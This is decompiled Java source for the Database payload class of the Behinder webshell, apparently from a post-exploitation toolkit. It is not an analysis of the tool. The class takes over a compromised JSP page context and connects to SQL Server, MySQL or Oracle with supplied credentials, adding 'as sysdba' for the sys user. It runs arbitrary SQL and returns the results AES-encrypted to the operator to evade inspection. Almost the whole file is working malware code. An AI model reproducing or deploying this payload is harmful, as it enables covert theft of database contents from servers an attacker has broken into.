//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.payload.java;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class Database {
    public static String type;
    public static String host;
    public static String port;
    public static String user;
    public static String pass;
    public static String database;
    public static String sql;
    private ServletResponse Response;
    private HttpSession Session;

    public Database() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        HashMap result = new HashMap();

        try {
            this.executeSQL();
            result.put("msg", this.executeSQL());
            result.put("status", "success");
        } catch (Exception var6) {
            var6.printStackTrace();
            result.put("status", "fail");
            if (var6 instanceof ClassNotFoundException) {
                result.put("msg", "NoDriver");
            } else {
                result.put("msg", var6.getMessage());
            }
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        return true;
    }

    public String executeSQL() throws Exception {
        String result = "[";
        String driver = null;
        String url = null;
        if (type.equals("sqlserver")) {
            driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
            url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";
        } else if (type.equals("mysql")) {
            driver = "com.mysql.jdbc.Driver";
            url = "jdbc:mysql://%s:%s/%s";
        } else if (type.equals("oracle")) {
            driver = "oracle.jdbc.driver.OracleDriver";
            url = "jdbc:oracle:thin:@%s:%s:%s";
            if (user.equals("sys")) {
                user = user + " as sysdba";
            }
        }

        url = String.format(url, host, port, database);
        Class.forName(driver);
        Connection con = DriverManager.getConnection(url, user, pass);
        Statement statement = con.createStatement();
        ResultSet rs = statement.executeQuery(sql);
        ResultSetMetaData metaData = rs.getMetaData();
        int count = metaData.getColumnCount();
        String[] colNames = new String[count];

        for(int i = 0; i < count; ++i) {
            colNames[i] = metaData.getColumnLabel(i + 1);
        }

        result = result + "[";
        String[] var13 = colNames;
        int var12 = colNames.length;

        for(int var11 = 0; var11 < var12; ++var11) {
            String col = var13[var11];
            String colRecord = String.format("{\"name\":\"%s\"}", col);
            result = result + colRecord + ",";
        }

        result = result.substring(0, result.length() - 1);
        result = result + "],";
        Map<String, Object> record = new LinkedHashMap();

        for(ArrayList recordList = new ArrayList(); rs.next(); result = result + "],") {
            result = result + "[";
            String[] var15 = colNames;
            int var21 = colNames.length;

            for(int var20 = 0; var20 < var21; ++var20) {
                String col = var15[var20];
                record.put(col, rs.getObject(col));
                result = result + "\"" + rs.getObject(col) + "\",";
            }

            recordList.add(record);
            result = result.substring(0, result.length() - 1);
        }

        result = result.substring(0, result.length() - 1);
        result = result + "]";
        rs.close();
        con.close();
        return result;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var6 = entity.keySet().iterator();

        while(var6.hasNext()) {
            String key = (String)var6.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }
}
